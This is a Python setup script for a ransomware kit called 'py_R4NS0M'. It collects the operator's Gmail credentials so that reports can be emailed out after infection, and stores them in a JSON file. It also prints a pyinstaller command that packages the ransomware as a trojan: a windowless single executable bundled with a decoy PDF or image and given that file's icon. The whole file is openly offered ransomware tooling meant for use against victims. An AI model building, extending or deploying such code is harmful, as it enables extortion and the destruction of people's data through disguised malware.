import os
from pyfiglet import figlet_format
from termcolor import colored
import json


def setup_ransom():
    header = figlet_format('py_R4NS0M')
    user_info = {}

    print(colored(header, color='magenta'))
    print('By dszyszek')
    print('===============================================================')

    print('Ok, let\'s setup your ransomware!')
    print('I\'ll need some info about you at first.')
    print('1. What\'s the email address you want to use? (on this address report will be sent after program execution)')
    print('Remember - by default program use Google server to send email, so you have to use Google email')
    email = input('Email address: ')
    password = input('Password: ')

    print('Ok, that\'s all for now. To run ransomware as trojan, type following command in main dir (pyinstaller required): ')
    print('pyinstaller ./ransom.py --add-data "<path to fake file (pdf, jpg)>;." --add-data "./img/frog.jpg;." --onefile --noconsole --icon "<path to icon of fake file>"')

    user_info['email'] = email
    user_info['password'] = password
    file_name = 'user'

    with open(f'./user_info/{file_name}.json', 'a+') as output_json:
        content = json.dumps(user_info)
        output_json.write(content)

    print(f'[+] Created {file_name}.json file at ./user_info')


if __name__ == '__main__':
    setup_ransom()